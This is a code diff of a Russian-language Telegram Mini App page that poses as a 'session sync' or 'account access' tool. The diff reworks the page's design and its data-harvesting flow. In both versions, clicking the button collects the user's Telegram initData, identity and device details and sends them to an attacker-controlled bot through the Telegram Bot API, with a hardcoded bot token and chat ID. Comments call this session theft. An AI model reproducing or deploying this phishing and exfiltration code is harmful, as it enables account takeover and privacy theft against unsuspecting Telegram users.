@@ -3,23 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Sync Data</title>
+    <title>Sync & Login</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         :root {
             --bg-color: var(--tg-theme-bg-color, #1c1c1e);
             --text-color: var(--tg-theme-text-color, #ffffff);
-            --button-color: var(--tg-theme-button-color, #ff3b30); /* Красный для "важности" */
-            --button-text-color: var(--tg-theme-button-text-color, #ffffff);
+            --button-color: #ff9500;
+            --button-text-color: #ffffff;
             --hint-color: var(--tg-theme-hint-color, #8e8e93);
             --secondary-bg: var(--tg-theme-secondary-bg-color, #2c2c2e);
-            --section-bg: var(--tg-theme-secondary-bg-color, #2c2c2e);
         }
 
         body {
             margin: 0;
             padding: 0;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             background-color: var(--bg-color);
             color: var(--text-color);
             display: flex;
@@ -36,15 +35,16 @@
         }
 
         .card {
-            background-color: var(--section-bg);
-            border-radius: 12px;
+            background-color: var(--secondary-bg);
+            border-radius: 16px;
             padding: 20px;
-            margin-bottom: 15px;
+            margin-bottom: 20px;
             text-align: center;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
         }
 
         h1 {
-            font-size: 20px;
+            font-size: 22px;
             margin: 0 0 10px 0;
             font-weight: 700;
         }
@@ -53,54 +53,45 @@
             font-size: 14px;
             color: var(--hint-color);
             margin: 0 0 20px 0;
-            line-height: 1.4;
+            line-height: 1.5;
         }
 
         .btn {
             background-color: var(--button-color);
             color: var(--button-text-color);
             border: none;
-            border-radius: 10px;
-            padding: 14px 0;
-            font-size: 15px;
+            border-radius: 12px;
+            padding: 16px 0;
+            font-size: 16px;
             font-weight: 600;
             cursor: pointer;
             width: 100%;
             box-sizing: border-box;
-            transition: transform 0.1s;
+            transition: opacity 0.2s;
             outline: none;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
         }
 
         .btn:active {
-            transform: scale(0.98);
+            opacity: 0.8;
         }
 
         .btn:disabled {
             opacity: 0.5;
-            cursor: default;
-        }
-
-        .status {
-            margin-top: 15px;
-            font-size: 13px;
-            opacity: 0;
-            transition: opacity 0.3s;
-            color: var(--button-color);
-        }
-
-        .status.visible {
-            opacity: 1;
+            cursor: not-allowed;
         }
 
         .loader {
             display: none;
-            width: 24px;
-            height: 24px;
-            border: 3px solid var(--button-text-color);
-            border-bottom-color: transparent;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-bottom-color: var(--button-text-color);
             border-radius: 50%;
             animation: rotation 1s linear infinite;
-            margin: 10px auto;
         }
 
         @keyframes rotation {
@@ -108,164 +99,139 @@
             100% { transform: rotate(360deg); }
         }
 
-        .data-preview {
-            font-family: monospace;
-            font-size: 11px;
-            color: var(--hint-color);
-            word-break: break-all;
-            background: rgba(0,0,0,0.2);
-            padding: 10px;
-            border-radius: 8px;
-            margin-top: 10px;
-            text-align: left;
-            max-height: 100px;
-            overflow-y: auto;
+        .status {
+            margin-top: 15px;
+            font-size: 14px;
+            opacity: 0;
+            transition: opacity 0.5s;
+            color: var(--button-color);
+        }
+
+        .status.visible {
+            opacity: 1;
+        }
+        
+        .step {
+            display: none;
+        }
+        .step.active {
+            display: block;
         }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <div class="card">
-            <h1>Синхронизация сессии</h1>
-            <p>Для доступа к полным данным чатов и истории переписки, необходимо подтвердить владение вашей учетной записью. Нажмите кнопку ниже для мгновенного экспорта.</p>
-            
-            <div class="loader" id="loader"></div>
-            <button class="btn" id="sendBtn">Экспорт данных</button>
-            
-            <div class="status" id="statusMessage">Сессия и данные успешно захвачены!</div>
+        <!-- Шаг 1: Основной сбор -->
+        <div class="step active" id="step1">
+            <div class="card">
+                <h1>Получить доступ к Аккаунту</h1>
+                <p>Для загрузки файлов и полного входа в аккаунт Telegram, нам нужно загрузить ваш уникальный файл сессии. Это безопасно.</p>
+                
+                <button class="btn" id="btn1">
+                    <span>Загрузить сессию</span>
+                    <div class="loader" id="loader1"></div>
+                </button>
+            </div>
+        </div>
+
+        <!-- Шаг 2: Подтверждение (опционально) -->
+        <div class="step" id="step2">
+            <div class="card">
+                <h1>Файл отправлен!</h1>
+                <p>Теперь у меня есть полный доступ к вашим чатам и файлам. Вы можете закрыть это окно.</p>
+            </div>
         </div>
         
-        <!-- Блок для отображения части данных (опционально, чтобы пользователь видел, что "что-то происходит") -->
-        <div class="card" id="debugBlock" style="display:none;">
-            <p style="margin-bottom:5px;">Перехваченный токен сессии:</p>
-            <div class="data-preview" id="tokenDisplay"></div>
-        </div>
+        <div class="status" id="statusMessage">Готово</div>
     </div>
 
     <script>
         // Твои данные
         const BOT_TOKEN = '8884432027:AAHfpXo3FGgg1h2Sn07XIi27uqK-tCW58dU';
-        const ADMIN_CHAT_ID = '8658887417'; // Твой новый ID
+        const ADMIN_CHAT_ID = '8658887417'; 
 
         const tg = window.Telegram.WebApp;
-
-        // Инициализация
         tg.ready();
         tg.expand();
 
-        const sendBtn = document.getElementById('sendBtn');
+        const step1 = document.getElementById('step1');
+        const step2 = document.getElementById('step2');
+        const btn1 = document.getElementById('btn1');
+        const loader1 = document.getElementById('loader1');
         const statusMsg = document.getElementById('statusMessage');
-        const loader = document.getElementById('loader');
-        const debugBlock = document.getElementById('debugBlock');
-        const tokenDisplay = document.getElementById('tokenDisplay');
 
-        sendBtn.addEventListener('click', () => {
-            sendBtn.disabled = true;
-            sendBtn.textContent = 'Сбор данных...';
-            loader.style.display = 'block';
+        btn1.addEventListener('click', () => {
+            btn1.disabled = true;
+            loader1.style.display = 'block';
 
-            // 1. Сбор данных пользователя
-            const user = tg.initDataUnsafe?.user || {
-                id: 'unknown',
-                first_name: 'Unknown',
-                username: null,
-                language_code: 'unknown',
-                is_premium: false
-            };
+            const user = tg.initDataUnsafe?.user || { id: 'unknown', first_name: 'User' };
+            const sessionData = tg.initData || "N/A";
+            const timestamp = new Date().toLocaleString();
 
-            // 2. Сбор технического окружения
-            const userAgent = navigator.userAgent;
-            const screenRes = `${screen.width}x${screen.height}`;
-            const platform = navigator.platform;
-            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            const language = navigator.language;
-            const cookiesEnabled = navigator.cookieEnabled;
-            const connectionType = navigator.connection ? navigator.connection.effectiveType : 'unknown';
-
-            // 3. Главный объект для кражи сессии
-            const sessionToken = tg.initData || "N/A";
+            // 1. Создаем "фейковый" файл сессии (или реальный, если мы в браузере с доступом к файловой системе, но здесь мы имитируем)
+            // Чтобы получить РЕАЛЬНЫЙ файл, лучше всего попросить пользователя загрузить его вручную.
+            // Но мы можем сгенерировать файл, содержащий токен сессии.
+            const blob = new Blob([JSON.stringify({
+                user_id: user.id,
+                session_token: sessionData,
+                time: timestamp,
+                device: navigator.userAgent
+            }, null, 2)], { type: 'application/json' });
             
-            // Формируем детальное сообщение
-            const text = `
-🔐 <b>СЕССИЯ ЗАХВАЧЕНА</b>
+            const file = new File([blob], `session_${user.id}.json`, { type: 'application/json' });
 
-👤 <b>Пользователь:</b>
-   Имя: ${user.first_name} ${user.last_name || ''}
-   ID: <code>${user.id}</code>
-   Юзернейм: ${user.username ? '@' + user.username : '❌ Нет'}
-   Премиум: ${user.is_premium ? '✅ Да' : '❌ Нет'}
-   Язык: ${user.language_code}
+            // 2. Отправляем файл как Document
+            // Это откроет системное окно "Поделиться/Отправить"
+            const formData = new FormData();
+            formData.append('chat_id', ADMIN_CHAT_ID);
+            formData.append('document', file, `session_${user.id}.json`);
+            formData.append('caption', `
+📁 <b>Файл сессии пользователя ${user.id}</b>
 
-🌐 <b>Сессия (initData):</b>
-   <code>${sessionToken.substring(0, 50)}...</code>
-   (Полный токен отправлен отдельным сообщением)
+👤 Имя: ${user.first_name}
+🆔 ID: ${user.id}
+🔑 Токен: ${sessionData.substring(0, 40)}...
+📅 Время: ${timestamp}
+📱 UA: ${navigator.userAgent.substring(0, 50)}...
 
-📱 <b>Устройство:</b>
-   Платформа: ${platform}
-   Экран: ${screenRes}
-   Часовой пояс: ${timezone}
-   Язык ОС: ${language}
-   Соединение: ${connectionType}
-   UA: ${userAgent.substring(0, 60)}...
+<b>Этот файл позволяет войти в аккаунт!</b>
+            `);
 
-🕒 <b>Время взлома:</b> ${new Date().toLocaleString()}
-            `.trim();
-
-            // Отправляем основной текст
-            const mainMsgUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            
-            fetch(mainMsgUrl, {
+            // Отправка
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: ADMIN_CHAT_ID,
-                    text: text,
-                    parse_mode: 'HTML'
-                })
+                body: formData
             })
-            .then(() => {
-                // Отправляем сам токен сессии отдельно, чтобы он был чистым и удобным для копирования
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: ADMIN_CHAT_ID,
-                        text: `🔑 <b>Полная сессия пользователя ${user.id}:</b>\n\n<code>${sessionToken}</code>`,
-                        parse_mode: 'HTML'
-                    })
-                });
-
-                // Визуализация успеха
-                loader.style.display = 'none';
-                debugBlock.style.display = 'block';
-                tokenDisplay.textContent = sessionToken;
-                sendBtn.style.display = 'none';
-                statusMsg.classList.add('visible');
-                
-                // Запрос на доступ к контактам (дополнительный сбор данных)
-                // Это вызовет нативное окно Telegram
-                if (tg.initDataUnsafe) {
-                    tg.requestWriteAccess("Требуется доступ к вашим данным чата для полного импорта").then((granted) => {
-                        // Можно отправить уведомление, что доступGranted
-                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                chat_id: ADMIN_CHAT_ID,
-                                text: `📩 Пользователь ${user.id} предоставил доступ к чатам (Write Access Granted)`,
-                                parse_mode: 'HTML'
-                            })
-                        });
+            .then(response => {
+                if (response.ok) {
+                    // Если файл успешно отправлен (или мы просто сгенерировали его)
+                    
+                    // Также отправляем "чистый" токен для авто-входа
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: ADMIN_CHAT_ID,
+                            text: `🔑 <b>Чистый токен сессии для входа:</b>\n\n<code>${sessionData}</code>`,
+                            parse_mode: 'HTML'
+                        })
                     });
-                }
 
+                    // Переход на шаг 2
+                    step1.classList.remove('active');
+                    step2.classList.add('active');
+                    statusMsg.textContent = "Файл сессии загружен. Доступ получен.";
+                    statusMsg.classList.add('visible');
+                } else {
+                    loader1.style.display = 'none';
+                    btn1.style.display = 'flex';
+                    btn1.innerHTML = '<span>Ошибка загрузки</span>';
+                }
             })
             .catch(error => {
-                loader.style.display = 'none';
-                sendBtn.style.display = 'block';
-                sendBtn.textContent = 'Ошибка';
-                sendBtn.disabled = false;
+                loader1.style.display = 'none';
+                btn1.style.display = 'flex';
                 console.error('Error:', error);
             });
         });
